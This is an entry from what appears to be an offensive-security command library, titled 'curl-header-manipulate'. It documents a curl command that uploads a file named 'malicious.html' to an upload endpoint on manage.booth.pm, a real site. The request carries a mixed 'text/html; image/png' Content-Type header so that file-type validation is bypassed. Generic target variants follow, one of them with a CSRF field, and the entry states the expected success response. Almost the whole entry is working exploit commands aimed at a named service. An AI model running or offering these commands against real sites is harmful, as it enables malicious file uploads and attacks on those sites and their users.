---
data: >-
  curl -X POST https://manage.booth.pm/design/edit/upload -H "Cookie:
  session=your_session_cookie" -H "Content-Type: text/html; image/png" --form
  "header_image=@malicious.html" -v
tags:
  - web
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:25.246Z'
id: d3c25f00-0aaf-4b8a-86c1-99cf9e1f7d1b
verified: false
validated: true
submitted: true
---
# curl-header-manipulate

## Command

```bash
curl -X POST https://manage.booth.pm/design/edit/upload -H "Cookie: session=your_session_cookie" -H "Content-Type: text/html; image/png" --form "header_image=@malicious.html" -v
```

## Description

This command uploads a file with a manipulated Content-Type header to bypass validation, simulating the exploit.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP POST method for upload | Yes |
| `-H "Content-Type: ..."` | Mixed MIME type to bypass | Yes |
| `--form "header_image=@file"` | Specifies the file to upload | Yes |
| `-v` | Verbose for debugging | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target/upload -H "Content-Type: text/html; image/png" --form "file=@test.html" -v
```

### Advanced Usage

```bash
curl -X POST https://target/upload -H "Cookie: session=abc" -H "Content-Type: text/html; image/png" --form "file=@test.html" --form "csrf=token" -v
```

## Expected Output

Server accepts the upload with 200 OK or success redirect; no type error in response.

## Related

- [[Related Procedure]]
